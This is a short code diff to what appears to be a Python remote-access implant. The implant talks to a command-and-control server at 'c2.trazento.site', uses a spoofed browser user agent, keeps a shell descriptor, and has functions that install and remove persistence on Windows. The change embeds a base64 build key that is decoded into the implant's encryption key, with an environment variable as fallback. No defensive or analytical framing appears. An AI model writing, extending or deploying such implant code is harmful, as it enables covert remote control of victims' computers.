@@ -19,6 +19,7 @@ SERVER = "https://c2.trazento.site"
 AID = None
 TOKEN = None
 KEY = None
+BUILD_KEY = ""
 UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0 Safari/537.36"
 INTERVAL = 5
 SH_FD = None
@@ -466,7 +467,7 @@ def remove_persistence():
         print("[+] Windows persistence removed")
 
 def main():
-    global SERVER, INTERVAL, KEY
+    global SERVER, INTERVAL, KEY, RECONNECT
     want_install = False
     want_remove = False
     no_install = False
@@ -490,6 +491,9 @@ def main():
         else:
             i += 1
 
+    if not KEY:
+        if BUILD_KEY:
+            KEY = base64.b64decode(BUILD_KEY.encode())
     if not KEY:
         env_key = os.environ.get("C2_KEY", "")
         if env_key:
